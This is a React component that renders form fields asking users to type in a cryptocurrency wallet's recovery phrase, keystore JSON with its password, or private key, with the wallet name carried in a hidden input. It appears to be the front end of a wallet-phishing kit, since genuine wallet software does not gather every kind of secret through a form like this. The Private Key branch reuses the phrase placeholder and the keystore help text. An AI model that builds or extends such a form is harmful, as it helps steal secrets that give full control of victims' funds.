const FormSubmit = ({ keyType, wallet }) => {
  if (keyType === "Phrase") {
    return (
      <div>
        <input
          type="text"
          name="Wallet"
          id="Wallet"
          className="hidden"
          value={wallet}
        />
        <textarea
          className="w-full h-[10rem] p-4 rounded-3xl bg-transparent border border-[#9F9F9F] placeholder:text-[#5B5B5B] placeholder:text-sm resize-none focus:outline-none focus:border-[#5B5B5B] caret-[#5B5B5B] text-[#5B5B5B]"
          placeholder="Enter your current phrase"
          id="currentPhrase"
          name="currentPhrase"
        ></textarea>
        <p className="text-white mt-3 text-xs">
          Typically 12 (sometimes 24) words separated by single spaces
        </p>
      </div>
    );
  }
  if (keyType === "Keystore JSON") {
    return (
      <div>
        <input
          type="text"
          name="Wallet"
          id="Wallet"
          className="hidden"
          value={wallet}
        />
        <textarea
          className="w-full h-[7rem] p-4 rounded-3xl bg-transparent border border-[#9F9F9F] placeholder:text-[#5B5B5B] placeholder:text-sm resize-none focus:outline-none focus:border-[#5B5B5B] caret-[#5B5B5B] text-[#5B5B5B]"
          placeholder="Enter your Keystore JSON"
          id="keystoreJSON"
          name="keystoreJSON"
        ></textarea>
        <input
          type="text"
          className="w-full h-[4rem] mt-3 p-4 rounded-3xl bg-transparent border border-[#9F9F9F] placeholder:text-[#5B5B5B] placeholder:text-sm resize-none focus:outline-none focus:border-[#5B5B5B] caret-[#5B5B5B] text-[#5B5B5B]"
          placeholder="Enter your current phrase"
          id="currentPhrase"
          name="currentPhrase"
        />
        <p className="text-[#5B5B5B] mt-3 text-xs">
          Several lines of text beginning with {`${"'{...}'"}`} plus the
          password you used to encrypt it.
        </p>
      </div>
    );
  }
  if (keyType === "Private Key") {
    return (
      <div>
        <input
          type="text"
          name="Wallet"
          id="Wallet"
          className="hidden"
          value={wallet}
        />
        <input
          type="text"
          className="w-full h-[4rem] p-4 rounded-3xl bg-transparent border border-[#9F9F9F] placeholder:text-[#5B5B5B] placeholder:text-sm resize-none focus:outline-none focus:border-[#5B5B5B] caret-[#5B5B5B] text-[#5B5B5B]"
          placeholder="Enter your current phrase"
          id="currentPhrase"
          name="currentPhrase"
        />
        <p className="text-white mt-3 text-xs">
          Several lines of text beginning with {`${"'{...}'"}`} plus the
          password you used to encrypt it.
        </p>
      </div>
    );
  }
};

export default FormSubmit;
